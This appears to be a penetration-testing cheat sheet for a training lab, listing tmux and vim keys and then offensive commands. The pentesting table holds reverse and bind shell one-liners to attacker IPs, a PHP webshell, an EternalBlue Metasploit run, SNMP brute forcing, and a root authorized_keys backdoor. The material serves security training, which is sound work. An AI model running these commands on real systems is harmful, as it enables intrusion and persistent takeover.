# Cheat Sheet

### Basic Tools

| **Command**                                                                                                             | **Description**                                                                                                                   |
| ----------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **General**                                                                                                             |                                                                                                                                   |
| <mark style="color:green;">`sudo openvpn user.ovpn`</mark>                                                              | Connect to VPN                                                                                                                    |
| <mark style="color:green;">`ifconfig`</mark><mark style="color:green;">/</mark><mark style="color:green;">`ip a`</mark> | Show our IP address                                                                                                               |
| <mark style="color:green;">`netstat -rn`</mark>                                                                         | Show networks accessible via the VPN                                                                                              |
| <mark style="color:green;">`ssh user@10.10.10.10`</mark>                                                                | SSH to a remote server                                                                                                            |
| <mark style="color:green;">`ftp 10.129.42.253`</mark>                                                                   | FTP to a remote server                                                                                                            |
| **tmux**                                                                                                                |                                                                                                                                   |
| <mark style="color:green;">`tmux`</mark>                                                                                | Start tmux                                                                                                                        |
| <mark style="color:green;">`ctrl+b ctrl+c`</mark>                                                                       | tmux: new window                                                                                                                  |
| <mark style="color:green;">`ctrl+b 1`</mark>                                                                            | tmux: switch to window (<mark style="color:green;">`1`</mark>)                                                                    |
| <mark style="color:green;">`ctrl+%`</mark>                                                                              | tmux: split pane vertically                                                                                                       |
| <mark style="color:green;">`ctrl+"`</mark>                                                                              | tmux: split pane horizontally                                                                                                     |
| <mark style="color:green;">`ctrl+->`</mark>                                                                             | tmux: switch to the right pane                                                                                                    |
| **Vim**                                                                                                                 |                                                                                                                                   |
| <mark style="color:green;">`vim file`</mark>                                                                            | vim: open <mark style="color:green;">`file`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> with vim  |
| `esc+i`                                                                                                                 | vim: enter <mark style="color:green;">`insert`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> mode   |
| `esc`                                                                                                                   | vim: back to <mark style="color:green;">`normal`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> mode |
| `x`                                                                                                                     | vim: Cut character                                                                                                                |
| `dw`                                                                                                                    | vim: Cut word                                                                                                                     |
| `dd`                                                                                                                    | vim: Cut full line                                                                                                                |
| `yw`                                                                                                                    | vim: Copy word                                                                                                                    |
| `yy`                                                                                                                    | vim: Copy full line                                                                                                               |
| `p`                                                                                                                     | vim: Paste                                                                                                                        |
| `:1`                                                                                                                    | vim: Go to line number 1.                                                                                                         |
| <mark style="color:green;">`:w`</mark>                                                                                  | vim: Write the file 'i.e. save'                                                                                                   |
| <mark style="color:green;">`:q`</mark>                                                                                  | vim: Quit                                                                                                                         |
| `:q!`                                                                                                                   | vim: Quit without saving                                                                                                          |
| <mark style="color:green;">`:wq`</mark>                                                                                 | vim: Write and quit                                                                                                               |

### Pentesting

| **Command**                                                                                                      | **Description**                                                       |
| ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                                             |                                                                       |
| <mark style="color:green;">`nmap 10.129.42.253`</mark>                                                           | Run nmap on an IP                                                     |
| <mark style="color:green;">`nmap -sV -sC -p- 10.129.42.253`</mark>                                               | Run an nmap script scan on an IP                                      |
| <mark style="color:green;">`locate scripts/citrix`</mark>                                                        | List various available nmap scripts                                   |
| <mark style="color:green;">`nmap --script smb-os-discovery.nse -p445 10.10.10.40`</mark>                         | Run an nmap script on an IP                                           |
| <mark style="color:green;">`netcat 10.10.10.10 22`</mark>                                                        | Grab banner of an open port                                           |
| <mark style="color:green;">`smbclient -N -L \\\\10.129.42.253`</mark>                                            | List SMB Shares                                                       |
| <mark style="color:green;">`smbclient \\\\10.129.42.253\\users`</mark>                                           | Connect to an SMB share                                               |
| <mark style="color:green;">`snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`</mark>                     | Scan SNMP on an IP                                                    |
| <mark style="color:green;">`onesixtyone -c dict.txt 10.129.42.254`</mark>                                        | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                                              |                                                                       |
| <mark style="color:green;">`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`</mark> | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`                            | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                                                         | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                                           | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                                                   | List potential directories in `robots.txt`                            |
| `ctrl+U`                                                                                                         | View page source (in Firefox)                                         |
| **Public Exploits**                                                                                              |                                                                       |
| `searchsploit openssh 7.2`                                                                                       | Search for public exploits for a web application                      |
| `msfconsole`                                                                                                     | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                                                     | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                                                        | MSF: Start using an MSF module                                        |
| `show options`                                                                                                   | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                                                         | MSF: Set a value for an MSF module option                             |
| `check`                                                                                                          | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                                                        | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                                                 |                                                                       |
| `nc -lvnp 1234`                                                                                                  | Start a `nc` listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                                            | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`                               | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`                                    | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                                             | Connect to a bind shell started on the remote server                  |
| <mark style="color:green;">`python -c 'import pty; pty.spawn("/bin/bash")'`</mark>                               | Upgrade shell TTY (1)                                                 |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                                                      | Upgrade shell TTY (2)                                                 |
| <mark style="color:green;">`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`</mark>              | Create a webshell php file                                            |
| <mark style="color:green;">`curl http://SERVER_IP:PORT/shell.php?cmd=id`</mark>                                  | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                                                         |                                                                       |
| <mark style="color:green;">`./linpeas.sh`</mark>                                                                 | Run `linpeas` script to enumerate remote server                       |
| `sudo -l`                                                                                                        | List available `sudo` privileges                                      |
| <mark style="color:green;">`sudo -u user /bin/echo Hello World!`</mark>                                          | Run a command with `sudo`                                             |
| `sudo su -`                                                                                                      | Switch to root user (if we have access to `sudo su`)                  |
| `sudo su user -`                                                                                                 | Switch to a user (if we have access to `sudo su`)                     |
| `ssh-keygen -f key`                                                                                              | Create a new SSH key                                                  |
| <mark style="color:green;">`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`</mark>   | Add the generated public key to the user                              |
| <mark style="color:green;">`ssh root@10.10.10.10 -i key`</mark>                                                  | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                                           |                                                                       |
| `python3 -m http.server 8000`                                                                                    | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                                                         | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                                           | Download a file on the remote server from our local machine           |
| <mark style="color:green;">`scp linenum.sh user@remotehost:/tmp/linenum.sh`</mark>                               | Transfer a file to the remote server with `scp` (requires SSH access) |
| <mark style="color:green;">`base64 shell -w 0`</mark>                                                            | Convert a file to `base64`                                            |
| <mark style="color:green;">`echo f0VMR...SNIO...InmDwU \| base64 -d > shell`</mark>                              | Convert a file from `base64` back to its orig                         |
| <mark style="color:green;">`md5sum shell`</mark>                                                                 | Check the file's `md5sum` to ensure it converted correctly            |
